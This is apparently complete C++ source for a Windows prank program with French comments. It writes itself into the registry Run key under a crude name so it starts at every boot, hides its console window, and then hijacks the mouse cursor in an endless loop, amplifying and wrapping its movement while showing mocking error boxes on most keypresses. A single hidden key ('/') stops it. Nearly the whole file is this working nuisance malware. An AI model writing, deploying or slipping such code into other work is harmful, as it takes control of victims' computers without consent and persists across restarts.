#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <limits.h>

using namespace std;

char *fileExt;
char szDir[256]; //dummy buffer

void demarrage( void )
{
	HKEY			hkey;
	std::string		key_name( "Penis32" );
	std::string		app_path(szDir);

	LONG ret = RegOpenKeyEx(	HKEY_LOCAL_MACHINE,
					"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
					0L,
					KEY_WRITE,
					&hkey );

	if ( ret == ERROR_SUCCESS )
	{
		/* Set full application path with a keyname to registry */
		ret = RegSetValueEx(	hkey,
					key_name.c_str(),
					0,
					REG_SZ,
					reinterpret_cast< const BYTE* >( app_path.c_str() ),
					REG_SZ );

	}

}


void Deplacement(POINT &P1 , POINT &P2)
{


// Stockage des Coordonnées ŕ l'Instant t1,t2,t3
	long x1=0,y1=0 ,x2=0,y2=0,x3,y3;

// Stockage des Coordonnées MAX de l'Ecran
	POINT Ecran = {GetSystemMetrics(SM_CXSCREEN)-1, GetSystemMetrics(SM_CYSCREEN)-1};

// Stockage du Vecteur de Déplacement
	POINT Delta;

// Calcul du Vecteur de Déplacement
	Delta.x = (P2.x-P1.x);
	Delta.y = (P2.y-P1.y);


// Récupération des Données
	x1=P1.x;
	y1=P1.y;

	x2=P2.x;
	y2=P2.y;


// Prévoit le Prochain Déplacement
// (Sans l'Effectuer car il y aura peut ętre des Ajustements ŕ faire)
	x3=x2+Delta.x;
	y3=y2+Delta.y;


	// Tester le Dépassement Droite-Gauche (Axe x)
	if ( (x3>=(Ecran.x)) || (x3<=0) )
	{


		// Changer les Prévisions en Cas de Dépassement en Positif (Vers la Gauche)
		if ( x3>=(Ecran.x) )
		 {
			x3=(0+Delta.x) - (Ecran.x-x2);
			x2=0 - (Ecran.x-x2);
		 }


		// Changer les Prévisions en Cas de Dépassement en Négatif (Vers la Droite)
		if ( x3<=0 )
		{
			x3=Ecran.x+Delta.x+x2;
			x2=Ecran.x+x2;
		 }

	}	// Fin du Test (Axe x)




	// Tester le Dépassement Haut-Bas (Axe y)
	if( (y3>=Ecran.y) ||  (y3<=0) )
	{


		// Changer les Prévisions en Cas de Dépassement en Positif (Vers le Haut)
		 if ( y3>=Ecran.y )
		 {
			y3=(0+(Delta.y)) - (Ecran.y-y2);
			y2=0 - (Ecran.y-y2);
		 }



		 // Changer les Prévisions en Cas de Dépassement en Négatif (Vers le Bas)
		 if ( y3<=0 )
		 {

			y3=Ecran.y+(Delta.y)+y2;
			y2=Ecran.y+y2;
		 }

	}	// Fin du Test (Axe y)


// On Réenregistre P2 car il servira pour le Prochain Déplacement
	P2.x=x2;
	P2.y=y2;


// Effectue le Déplacement (Si Besoin, des Ajustements ont été faits depuis les Prévisions)
	SetCursorPos(x3,y3);

	Sleep (8);


}	// Fin de Deplacement


int main(int argc, char* argv[])
{
    GetFullPathName(argv[0], 256, szDir, &fileExt);


    demarrage();

    ShowWindow(GetConsoleWindow(), SW_HIDE);

	POINT P1,P2;
	GetCursorPos(&P1);
	Sleep(8);


	do
	{


        Sleep(100);

	    GetCursorPos(&P2);
		Deplacement(P1 , P2);
		Sleep(8);
		GetCursorPos(&P1);
		Deplacement(P2 , P1);
		Sleep(8);



	    if (kbhit()) {
            char touche;
            touche = getch();
            int ctrlValue=::GetKeyState(VK_CONTROL);



/////////////////////////////
            if((int) touche == 47) {

                return 0;
                exit(0);
/////////////////////////////
            }

            else if (ctrlValue){

                    MessageBoxA(0,"ERROR 404 PAS FOUND MDR","", MB_ICONERROR);

                }
                else {
                        MessageBoxA(0,"ERROR 404 PAS FOUND MDR","", MB_ICONERROR);

                }

            }



	}while(1);


	return 0;
}
